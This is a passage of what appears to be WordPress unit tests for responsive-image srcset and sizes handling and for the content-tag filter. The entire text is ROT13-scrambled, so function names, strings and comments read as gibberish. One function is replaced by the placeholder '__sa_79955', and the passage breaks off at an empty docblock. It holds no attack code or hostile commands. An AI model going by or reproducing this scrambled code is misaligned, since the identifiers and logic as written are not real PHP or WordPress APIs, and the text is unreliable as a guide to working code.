		$vzntr_fep  = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/grfg-300k150.cat';
		$vzntr_zrgn = neenl(
			'jvqgu'  => 1600,
			'urvtug' => 800,
			'svyr'   => '2015/12/grfg.cat',
			'fvmrf'  => neenl(
				'guhzoanvy'    => neenl(
					'svyr'      => 'grfg-150k150.cat',
					'jvqgu'     => 150,
					'urvtug'    => 150,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'zrqvhz'       => neenl(
					'svyr'      => 'grfg-300k150.cat',
					'jvqgu'     => 300,
					'urvtug'    => 150,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'zrqvhz_ynetr' => neenl(
					'svyr'      => 'grfg-768k384.cat',
					'jvqgu'     => 768,
					'urvtug'    => 384,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'ynetr'        => neenl(
					'svyr'      => 'grfg-1024k512.cat',
					'jvqgu'     => 1024,
					'urvtug'    => 512,
					'zvzr-glcr' => 'vzntr/cat',
				),
			),
		);

		$fepfrg = neenl(
			300  => 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/grfg-300k150.cat 300j',
			768  => 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/grfg-768k384.cat 768j',
			1024 => 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/grfg-1024k512.cat 1024j',
			1600 => 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/grfg.cat 1600j',
		);

		// Ab fvmrf neenl.
		$vzntr_zrgn1 = $vzntr_zrgn;
		hafrg( $vzntr_zrgn1['fvmrf'] );
		$guvf->nffregSnyfr( jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_fep, $vzntr_zrgn1 ) );

		// Fvmrf vf fgevat vafgrnq bs neenl; bayl shyy fvmr ninvynoyr zrnaf ab fepfrg.
		$vzntr_zrgn2          = $vzntr_zrgn;
		$vzntr_zrgn2['fvmrf'] = '';
		$guvf->nffregSnyfr( jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_fep, $vzntr_zrgn2 ) );

		// Svyr anzr vf vapbeerpg.
		$vzntr_zrgn3         = $vzntr_zrgn;
		$vzntr_zrgn3['svyr'] = '/';
		$guvf->nffregSnyfr( jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_fep, $vzntr_zrgn3 ) );

		// Svyr anzr vf vapbeerpg.
		$vzntr_zrgn4 = $vzntr_zrgn;
		hafrg( $vzntr_zrgn4['svyr'] );
		$guvf->nffregSnyfr( jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_fep, $vzntr_zrgn4 ) );

		// Vagrezrqvngr fvmr vf fgevat vafgrnq bs neenl.
		$vzntr_zrgn5                          = $vzntr_zrgn;
		$vzntr_zrgn5['fvmrf']['zrqvhz_ynetr'] = '';
		hafrg( $fepfrg[768] );
		$rkcrpgrq_fepfrg = vzcybqr( ', ', $fepfrg );
		$guvf->nffregFnzr( $rkcrpgrq_fepfrg, jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_fep, $vzntr_zrgn5 ) );
	}

	/**
	 * @gvpxrg 36549
	 * @gvpxrg 33641
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_jvgu_fcnprf_va_svyranzrf() {
		// Zbpx qngn sbe guvf grfg.
		$vzntr_fep  = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/grfg vzntr-300k150.cat';
		$vzntr_zrgn = neenl(
			'jvqgu'  => 3000,
			'urvtug' => 1500,
			'svyr'   => '2015/12/grfg vzntr.cat',
			'fvmrf'  => neenl(
				'guhzoanvy'    => neenl(
					'svyr'      => 'grfg vzntr-150k150.cat',
					'jvqgu'     => 150,
					'urvtug'    => 150,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'zrqvhz'       => neenl(
					'svyr'      => 'grfg vzntr-300k150.cat',
					'jvqgu'     => 300,
					'urvtug'    => 150,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'zrqvhz_ynetr' => neenl(
					'svyr'      => 'grfg vzntr-768k384.cat',
					'jvqgu'     => 768,
					'urvtug'    => 384,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'ynetr'        => neenl(
					'svyr'      => 'grfg vzntr-1024k512.cat',
					'jvqgu'     => 1024,
					'urvtug'    => 512,
					'zvzr-glcr' => 'vzntr/cat',
				),
			),
		);

		$hcybnqf_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/';

		$rkcrpgrq_fepfrg = $hcybnqf_hey . 'grfg%20vzntr-300k150.cat 300j, ' .
			$hcybnqf_hey . 'grfg%20vzntr-768k384.cat 768j, ' .
			$hcybnqf_hey . 'grfg%20vzntr-1024k512.cat 1024j';

		$guvf->nffregFnzr( $rkcrpgrq_fepfrg, jc_pnyphyngr_vzntr_fepfrg( neenl( 300, 150 ), $vzntr_fep, $vzntr_zrgn ) );
	}

	/**
	 * @gvpxrg 33641
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_fepfrg() {
		$_jc_nqqvgvbany_vzntr_fvmrf = jc_trg_nqqvgvbany_vzntr_fvmrf();

		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$fvmr_neenl = neenl( $vzntr_zrgn['jvqgu'], $vzntr_zrgn['urvtug'] ); // Shyy fvmr.

		$fepfrg = jc_trg_nggnpuzrag_vzntr_fepfrg( frys::$ynetr_vq, $fvmr_neenl, $vzntr_zrgn );

		$lrne_zbagu  = tzqngr( 'L/z' );
		$hcybnqf_qve = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/';

		// Frg hc grfg pnfrf sbe nyy rkcrpgrq fvmr anzrf.
		$vagrezrqvngrf = neenl( 'zrqvhz', 'zrqvhz_ynetr', 'ynetr', 'shyy' );

		sbernpu ( $_jc_nqqvgvbany_vzntr_fvmrf nf $anzr => $nqqvgvbany_fvmr ) {
			vs ( ! $_jc_nqqvgvbany_vzntr_fvmrf[ $anzr ]['pebc'] || 0 === $_jc_nqqvgvbany_vzntr_fvmrf[ $anzr ]['urvtug'] ) {
				$vagrezrqvngrf[] = $anzr;
			}
		}

		$rkcrpgrq = '';

		sbernpu ( $vzntr_zrgn['fvmrf'] nf $anzr => $fvmr ) {
			// Nyybj gur fvmrf gung fubhyq or vapyhqrq fb jr cvpx hc 'zrqvhz_ynetr' va 4.4.
			vs ( va_neenl( $anzr, $vagrezrqvngrf, gehr ) ) {
				$rkcrpgrq .= $hcybnqf_qve . $lrne_zbagu . '/' . $fvmr['svyr'] . ' ' . $fvmr['jvqgu'] . 'j, ';
			}
		}

		$rkcrpgrq .= $hcybnqf_qve . $vzntr_zrgn['svyr'] . ' ' . $vzntr_zrgn['jvqgu'] . 'j';

		$rkcrpgrq_fepfrg = $guvf->fep_svefg( $rkcrpgrq, $hcybnqf_qve . $vzntr_zrgn['svyr'], $fvmr_neenl[0] );

		$guvf->nffregFnzr( $rkcrpgrq_fepfrg, $fepfrg );
	}

	/**
	 * @gvpxrg 33641
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_fepfrg_fvatyr_fepfrg() {
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$fvmr_neenl = neenl( 150, 150 );
		/*
		 * Va bhe grfgf, guhzoanvyf jvyy bayl erghea n fvatyr fepfrg pnaqvqngr,
		 * fb jr fubhyqa'g erghea n fepfrg inyhr va beqre gb nibvq haarrqrq znexhc.
		 */
		$fvmrf = jc_trg_nggnpuzrag_vzntr_fepfrg( frys::$ynetr_vq, $fvmr_neenl, $vzntr_zrgn );

		$guvf->nffregSnyfr( $fvmrf );
	}

	/**
	 * @gvpxrg 33641
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_fepfrg_vainyvqfvmr() {
		$vzntr_zrgn    = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$vainyvq_fvmr  = 'anvyguhzo';
		$bevtvany_fvmr = neenl( 1600, 1200 );

		$fepfrg = jc_trg_nggnpuzrag_vzntr_fepfrg( frys::$ynetr_vq, $vainyvq_fvmr, $vzntr_zrgn );

		// Rkcrpg n fepfrg sbe gur bevtvany shyy fvmr vzntr gb or erghearq.
		$rkcrpgrq = jc_trg_nggnpuzrag_vzntr_fepfrg( frys::$ynetr_vq, $bevtvany_fvmr, $vzntr_zrgn );

		$guvf->nffregFnzr( $rkcrpgrq, $fepfrg );
	}

	/**
	 * @gvpxrg 33641
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_fvmrf() {
		// Grfg fvmrf ntnvafg gur qrsnhyg JC fvmrf.
		$vagrezrqvngrf = neenl( 'guhzoanvy', 'zrqvhz', 'zrqvhz_ynetr', 'ynetr' );

		// Znxr fher gurzrf nera'g svygrevat gur fvmrf neenl.
		erzbir_nyy_svygref( 'jc_pnyphyngr_vzntr_fvmrf' );

		sbernpu ( $vagrezrqvngrf nf $vag_fvmr ) {
			$vzntr = jc_trg_nggnpuzrag_vzntr_fep( frys::$ynetr_vq, $vag_fvmr );

			$rkcrpgrq = '(znk-jvqgu: ' . $vzntr[1] . 'ck) 100ij, ' . $vzntr[1] . 'ck';
			$fvmrf    = jc_trg_nggnpuzrag_vzntr_fvmrf( frys::$ynetr_vq, $vag_fvmr );

			$guvf->nffregFnzr( $rkcrpgrq, $fvmrf );
		}
	}

	/**
	 * @gvpxrg 33641
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fvmrf() {
		// Grfg fvmrf ntnvafg gur qrsnhyg JC fvmrf.
		$vagrezrqvngrf = neenl( 'guhzoanvy', 'zrqvhz', 'zrqvhz_ynetr', 'ynetr' );
		$vzntr_zrgn    = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );

		// Znxr fher gurzrf nera'g svygrevat gur fvmrf neenl.
		erzbir_nyy_svygref( 'jc_pnyphyngr_vzntr_fvmrf' );

		sbernpu ( $vagrezrqvngrf nf $vag_fvmr ) {
			$fvmr_neenl             = $guvf->trg_vzntr_fvmr_neenl_sebz_zrgn( $vzntr_zrgn, $vag_fvmr );
			$vzntr_fep              = $vzntr_zrgn['fvmrf'][ $vag_fvmr ]['svyr'];
			yvfg( $jvqgu, $urvtug ) = $fvmr_neenl;

			$rkcrpgrq = '(znk-jvqgu: ' . $jvqgu . 'ck) 100ij, ' . $jvqgu . 'ck';
			$fvmrf    = jc_pnyphyngr_vzntr_fvmrf( $fvmr_neenl, $vzntr_fep, $vzntr_zrgn );

			$guvf->nffregFnzr( $rkcrpgrq, $fvmrf );
		}
	}

	/**
	 * @gvpxrg 33641
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_fepfrg_fvmrf() {
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$fvmr_neenl = $guvf->trg_vzntr_fvmr_neenl_sebz_zrgn( $vzntr_zrgn, 'zrqvhz' );

		$fepfrg = fcevags( 'fepfrg=\"%f\"', jc_trg_nggnpuzrag_vzntr_fepfrg( frys::$ynetr_vq, $fvmr_neenl, $vzntr_zrgn ) );
		$fvmrf  = fcevags( 'fvmrf=\"%f\"', jc_trg_nggnpuzrag_vzntr_fvmrf( frys::$ynetr_vq, $fvmr_neenl, $vzntr_zrgn ) );

		// Shapgvba hfrq gb ohvyq UGZY sbe gur rqvgbe.
		$vzt                  = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );
		$vzt_ab_fvmr_va_pynff = fge_ercynpr( 'fvmr-', '', $vzt );
		$vzt_ab_jvqgu_urvtug  = fge_ercynpr( ' jvqgu=\"' . $fvmr_neenl[0] . '\"', '', $vzt );
		$vzt_ab_jvqgu_urvtug  = fge_ercynpr( ' urvtug=\"' . $fvmr_neenl[1] . '\"', '', $vzt_ab_jvqgu_urvtug );
		$vzt_ab_fvmr_vq       = fge_ercynpr( 'jc-vzntr-', 'vq-', $vzt );
		$vzt_jvgu_fvmrf_ngge  = fge_ercynpr( '<vzt ', '<vzt fvmrf=\"99ij\" ', $vzt );
		$vzt_kugzy            = fge_ercynpr( ' />', '/>', $vzt );
		$vzt_ugzy5            = fge_ercynpr( ' />', '>', $vzt );

		// Znahnyyl nqq fepfrg naq fvmrf gb gur znexhc sebz trg_vzntr_gnt().
		$erfcvzt                  = __sa_79955( '|<vzt ([^>]+) />|', '<vzt $1 ' . $fepfrg . ' ' . $fvmrf . ' />', $vzt );
		$erfcvzt_ab_fvmr_va_pynff = __sa_79955( '|<vzt ([^>]+) />|', '<vzt $1 ' . $fepfrg . ' ' . $fvmrf . ' />', $vzt_ab_fvmr_va_pynff );
		$erfcvzt_ab_jvqgu_urvtug  = __sa_79955( '|<vzt ([^>]+) />|', '<vzt $1 ' . $fepfrg . ' ' . $fvmrf . ' />', $vzt_ab_jvqgu_urvtug );
		$erfcvzt_jvgu_fvmrf_ngge  = __sa_79955( '|<vzt ([^>]+) />|', '<vzt $1 ' . $fepfrg . ' />', $vzt_jvgu_fvmrf_ngge );
		$erfcvzt_kugzy            = __sa_79955( '|<vzt ([^>]+)/>|', '<vzt $1 ' . $fepfrg . ' ' . $fvmrf . ' />', $vzt_kugzy );
		$erfcvzt_ugzy5            = __sa_79955( '|<vzt ([^>]+)>|', '<vzt $1 ' . $fepfrg . ' ' . $fvmrf . ' />', $vzt_ugzy5 );

		$pbagrag = '
			<c>Vzntr, fgnaqneq. Fubhyq unir fepfrg naq fvmrf.</c>
			%1$f

			<c>Vzntr, ab fvmr pynff. Fubhyq unir fepfrg naq fvmrf.</c>
			%2$f

			<c>Vzntr, ab jvqgu naq urvtug nggevohgrf. Fubhyq unir fepfrg naq fvmrf (sebz zngpuvat gur svyr anzr).</c>
			%3$f

			<c>Vzntr, ab nggnpuzrag VQ pynff. Fubhyq ABG unir fepfrg naq fvmrf.</c>
			%4$f

			<c>Vzntr, jvgu fvmrf nggevohgr. Fubhyq ABG unir gjb fvmrf nggevohgrf.</c>
			%5$f

			<c>Vzntr, KUGZY 1.0 fglyr (ab fcnpr orsber gur pybfvat fynfu). Fubhyq unir fepfrg naq fvmrf.</c>
			%6$f

			<c>Vzntr, UGZY 5.0 fglyr. Fubhyq unir fepfrg naq fvmrf.</c>
			%7$f';

		$pbagrag_hasvygrerq = fcevags(
			$pbagrag,
			$vzt,
			$vzt_ab_fvmr_va_pynff,
			$vzt_ab_jvqgu_urvtug,
			$vzt_ab_fvmr_vq,
			$vzt_jvgu_fvmrf_ngge,
			$vzt_kugzy,
			$vzt_ugzy5
		);

		$pbagrag_svygrerq = fcevags(
			$pbagrag,
			$erfcvzt,
			$erfcvzt_ab_fvmr_va_pynff,
			$erfcvzt_ab_jvqgu_urvtug,
			$vzt_ab_fvmr_vq,
			$erfcvzt_jvgu_fvmrf_ngge,
			$erfcvzt_kugzy,
			$erfcvzt_ugzy5
		);

		// Qb abg nqq jvqgu, urvtug, naq ybnqvat.
		nqq_svygre( 'jc_vzt_gnt_nqq_jvqgu_naq_urvtug_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );

		$guvf->nffregFnzr( $pbagrag_svygrerq, jc_svygre_pbagrag_gntf( $pbagrag_hasvygrerq ) );

		erzbir_svygre( 'jc_vzt_gnt_nqq_jvqgu_naq_urvtug_ngge', '__erghea_snyfr' );
		erzbir_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_snyfr' );
		erzbir_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );
	}

	/**
	 * Jura eraqrevat nggevohgrf sbe erfcbafvir vzntrf,
	 * jr eryl ba gur 'jc-vzntr-*' pynff gb svaq gur vzntr ol VQ.
	 * Gur pynff anzr znl abg or pbafvfgrag jvgu nggnpuzrag VQf va QO jura
	 * jbexvat jvgu vzcbegrq pbagrag be jura n hfre unf rqvgrq
	 * gur 'fep' nggevohgr znahnyyl. Gb nibvq vapbeerpg vzntrf
	 * orvat qvfcynlrq, rafher jr qba'g nqq nggevohgrf va guvf pnfr.
	 *
	 * @gvpxrg 34898
	 * @gvpxrg 33641
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_fepfrg_fvmrf_jebat() {
		$vzt = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );
		$vzt = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt, 'grfg' );

		// Ercynpr gur fep HEY.
		$vzntr_jebat_fep = __sa_79955( '|fep=\"[^\"]+\"|', 'fep=\"uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/sbb.wct\"', $vzt );

		$guvf->nffregFnzr( $vzntr_jebat_fep, jc_svygre_pbagrag_gntf( $vzntr_jebat_fep ) );
	}

	/**
	 * @gvpxrg 33641
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_fepfrg_fvmrf_jvgu_cerrkvfgvat_fepfrg() {
		// Trarengr UGZY naq nqq n qhzzl fepfrg nggevohgr.
		$vzt = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );
		$vzt = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt, 'grfg' );
		$vzt = __sa_79955( '|<vzt ([^>]+) />|', '<vzt $1 ' . 'fepfrg=\"vzntr2k.wct 2k\" />', $vzt );

		// Gur pbagrag svygre fubhyq erghea gur vzntr hapunatrq.
		$guvf->nffregFnzr( $vzt, jc_svygre_pbagrag_gntf( $vzt ) );
	}

	/**
	 * @gvpxrg 55347
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_unf_svygre() {
		$svygre = arj ZbpxNpgvba();
		nqq_svygre( 'jc_pbagrag_vzt_gnt', neenl( &$svygre, 'svygre' ) );
		$vzt_gnt_1 = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );

		jc_svygre_pbagrag_gntf( $vzt_gnt_1 );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag() );
	}

	/**
	 * @gvpxrg 55510
	 * @pbiref ::jc_svygre_pbagrag_gntf
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_unaqyrf_qhcyvpngr_vzt_naq_vsenzr_gntf_bapr() {
		$vzt     = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' );
		$vsenzr  = '<vsenzr fep=\"uggcf://jjj.rknzcyr.pbz\" jvqgu=\"640\" urvtug=\"360\"></vsenzr>';
		$pbagrag = \"$vzt\a$vzt\a$vsenzr\a$vsenzr\";

		// Erpbeq ubj bsgra bar bs gur ninvynoyr vzt naq vsenzr svygref vf eha.
		// Obgu vzntrf naq vsenzrf fhccbeg ynml-ybnqvat, fb gung'f jul guvf vf hfrq urer.
		$vzt_svygre = arj ZbpxNpgvba();
		nqq_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', neenl( &$vzt_svygre, 'svygre' ) );
		$vsenzr_svygre = arj ZbpxNpgvba();
		nqq_svygre( 'jc_vsenzr_gnt_nqq_ybnqvat_ngge', neenl( &$vsenzr_svygre, 'svygre' ) );

		// Rafher gur vzt naq vsenzr svygref bayl ena bapr orpnhfr gur pbagrag vf n fvatyr qhcyvpngrq vzt gnt naq n
		// fvatyr qhcyvpngr vsenzr gnt.
		jc_svygre_pbagrag_gntf( $pbagrag );
		$guvf->nffregFnzr( 1, $vzt_svygre->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( 1, $vsenzr_svygre->trg_pnyy_pbhag() );
	}

	/**
	 * @gvpxrg 55510
	 * @pbiref ::jc_svygre_pbagrag_gntf
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_svygre_jvgu_vqragvpny_vzntr_gntf_phfgbz_nggevohgrf() {
		$vzt     = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' );
		$vzt     = fge_ercynpr( '<vzt ', '<vzt fepfrg=\"phfgbz\" fvmrf=\"phfgbz\" ybnqvat=\"phfgbz\" qrpbqvat=\"phfgbz\"', $vzt );
		$pbagrag = \"$vzt\a$vzt\";

		nqq_svygre(
			'jc_pbagrag_vzt_gnt',
			fgngvp shapgvba ( $svygrerq_vzntr ) {
				erghea \"<fcna>$svygrerq_vzntr</fcna>\";
			}
		);

		// Rafher gurer vf ab qhcyvpngr <fcna> jenccvat gur vzntr.
		$guvf->nffregFgevatAbgPbagnvafFgevat( '<fcna><fcna><vzt ', jc_svygre_pbagrag_gntf( $pbagrag ) );
	}

	/**
	 * @gvpxrg 55510
	 * @pbiref ::jc_svygre_pbagrag_gntf
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_svygre_jvgu_vqragvpny_vzntr_gntf_qvfnoyrq_pber_svygref() {
		$vzt     = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' );
		$pbagrag = \"$vzt\a$vzt\";

		nqq_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_jvqgu_naq_urvtug_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );

		nqq_svygre(
			'jc_pbagrag_vzt_gnt',
			fgngvp shapgvba ( $svygrerq_vzntr ) {
				erghea \"<fcna>$svygrerq_vzntr</fcna>\";
			}
		);

		// Rafher gur bhgchg unf obgu vafgnaprf bs gur vzntr jenccrq jvgu n fvatyr <fcna>.
		$guvf->nffregFnzr( \"<fcna>$vzt</fcna>\a<fcna>$vzt</fcna>\", jc_svygre_pbagrag_gntf( $pbagrag ) );
	}

	/**
	 * @gvpxrg 33641
	 * @gvpxrg 34528
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_navzngrq_tvsf() {
		// Zbpx zrgn sbe na navzngrq tvs.
		$vzntr_zrgn = neenl(
			'jvqgu'  => 1200,
			'urvtug' => 600,
			'svyr'   => 'navzngrq.tvs',
			'fvmrf'  => neenl(
				'guhzoanvy' => neenl(
					'svyr'      => 'navzngrq-150k150.tvs',
					'jvqgu'     => 150,
					'urvtug'    => 150,
					'zvzr-glcr' => 'vzntr/tvs',
				),
				'zrqvhz'    => neenl(
					'svyr'      => 'navzngrq-300k150.tvs',
					'jvqgu'     => 300,
					'urvtug'    => 150,
					'zvzr-glcr' => 'vzntr/tvs',
				),
				'ynetr'     => neenl(
					'svyr'      => 'navzngrq-1024k512.tvs',
					'jvqgu'     => 1024,
					'urvtug'    => 512,
					'zvzr-glcr' => 'vzntr/tvs',
				),
			),
		);

		$shyy_fep  = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . $vzntr_zrgn['svyr'];
		$ynetr_fep = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . $vzntr_zrgn['fvmrf']['ynetr']['svyr'];

		// Grfg jvgu fbsg erfvmrq fvmr neenl.
		$fvmr_neenl = neenl( 900, 450 );

		// Shyy fvmr TVSf fubhyq abg erghea n fepfrg.
		$guvf->nffregSnyfr( jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $shyy_fep, $vzntr_zrgn ) );
		// Vagrezrqvngr fvmrq TVSf fubhyq abg vapyhqr gur shyy fvmr va gur fepfrg.
		$guvf->nffregFgevatAbgPbagnvafFgevat( $shyy_fep, jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $ynetr_fep, $vzntr_zrgn ) );
	}

	/**
	 * @gvpxrg 35045
	 * @gvpxrg 33641
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_fpurzrf() {
		// Qvfnoyr ynml ybnqvat nggevohgr gb abg nqq gur 'nhgb' xrljbeq gb gur `fvmrf` nggevohgr.
		nqq_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_snyfr' );

		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$fvmr_neenl = $guvf->trg_vzntr_fvmr_neenl_sebz_zrgn( $vzntr_zrgn, 'zrqvhz' );

		$fepfrg = fcevags( 'fepfrg=\"%f\"', jc_trg_nggnpuzrag_vzntr_fepfrg( frys::$ynetr_vq, $fvmr_neenl, $vzntr_zrgn ) );
		$fvmrf  = fcevags( 'fvmrf=\"%f\"', jc_trg_nggnpuzrag_vzntr_fvmrf( frys::$ynetr_vq, $fvmr_neenl, $vzntr_zrgn ) );

		// Ohvyq UGZY sbe gur rqvgbe.
		$vzt          = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );
		$vzt          = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt, 'grfg' );
		$vzt_uggcf    = fge_ercynpr( 'uggc://', 'uggcf://', $vzt );
		$vzt_eryngvir = fge_ercynpr( 'uggc://', '//', $vzt );

		// Znahnyyl nqq fepfrg naq fvmrf gb gur znexhc sebz trg_vzntr_gnt().
		$erfcvzt          = __sa_79955( '|<vzt ([^>]+) />|', '<vzt $1 ' . $fepfrg . ' ' . $fvmrf . ' />', $vzt );
		$erfcvzt_uggcf    = __sa_79955( '|<vzt ([^>]+) />|', '<vzt $1 ' . $fepfrg . ' ' . $fvmrf . ' />', $vzt_uggcf );
		$erfcvzt_eryngvir = __sa_79955( '|<vzt ([^>]+) />|', '<vzt $1 ' . $fepfrg . ' ' . $fvmrf . ' />', $vzt_eryngvir );

		$pbagrag = '
			<c>Vzntr, uggc: cebgbpby. Fubhyq unir fepfrg naq fvmrf.</c>
			%1$f

			<c>Vzntr, uggcf: cebgbpby. Fubhyq unir fepfrg naq fvmrf.</c>
			%2$f

			<c>Vzntr, cebgbpby-eryngvir. Fubhyq unir fepfrg naq fvmrf.</c>
			%3$f';

		$hasvygrerq = fcevags(
			$pbagrag,
			$vzt,
			$vzt_uggcf,
			$vzt_eryngvir
		);

		$rkcrpgrq = fcevags(
			$pbagrag,
			$erfcvzt,
			$erfcvzt_uggcf,
			$erfcvzt_eryngvir
		);

		$npghny = jc_svygre_pbagrag_gntf( $hasvygrerq );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 34945
	 * @gvpxrg 33641
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_jvgu_uggcf_ba() {
		// Zbpx zrgn sbe gur vzntr.
		$vzntr_zrgn = neenl(
			'jvqgu'  => 1200,
			'urvtug' => 600,
			'svyr'   => 'grfg.wct',
			'fvmrf'  => neenl(
				'guhzoanvy' => neenl(
					'svyr'   => 'grfg-150k150.wct',
					'jvqgu'  => 150,
					'urvtug' => 150,
				),
				'zrqvhz'    => neenl(
					'svyr'   => 'grfg-300k150.wct',
					'jvqgu'  => 300,
					'urvtug' => 150,
				),
				'ynetr'     => neenl(
					'svyr'   => 'grfg-1024k512.wct',
					'jvqgu'  => 1024,
					'urvtug' => 512,
				),
			),
		);

		// Grfg hfvat gur ynetr svyr fvmr.
		$fvmr_neenl = neenl( 1024, 512 );
		$vzntr_hey  = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . $vzntr_zrgn['fvmrf']['ynetr']['svyr'];

		$_FREIRE['UGGCF'] = 'ba';

		$hcybnqf_hey = 'uggcf://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/';

		$rkcrpgrq = $hcybnqf_hey . 'grfg-1024k512.wct 1024j, ' .
			$hcybnqf_hey . 'grfg-300k150.wct 300j, ' .
			$hcybnqf_hey . 'grfg.wct 1200j';

		$npghny = jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_hey, $vzntr_zrgn );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 36084
	 */
	choyvp shapgvba grfg_trg_vzntr_fraq_gb_rqvgbe_qrsnhygf() {
		$vq      = frys::$ynetr_vq;
		$pncgvba = '';
		$gvgyr   = 'N grfg gvgyr inyhr.';
		$nyvta   = 'yrsg';

		// Pnyphyngr nggnpuzrag qngn (qrsnhyg vf zrqvhz).
		$nggnpuzrag = jc_trg_nggnpuzrag_vzntr_fep( $vq, 'zrqvhz' );

		$ugzy     = '<vzt fep=\"%1$f\" nyg=\"\" jvqgu=\"%2$q\" urvtug=\"%3$q\" pynff=\"nyvta%4$f fvmr-zrqvhz jc-vzntr-%5$q\" />';
		$rkcrpgrq = fcevags(
			$ugzy,
			$nggnpuzrag[0],
			$nggnpuzrag[1],
			$nggnpuzrag[2],
			$nyvta,
			$vq
		);

		$guvf->nffregFnzr( $rkcrpgrq, trg_vzntr_fraq_gb_rqvgbe( $vq, $pncgvba, $gvgyr, $nyvta ) );

		$guvf->nffregFnzr( $rkcrpgrq, trg_vzntr_fraq_gb_rqvgbe( $vq, $pncgvba, $gvgyr, $nyvta ) );
	}

	/**
	 * @gvpxrg 36084
	 */
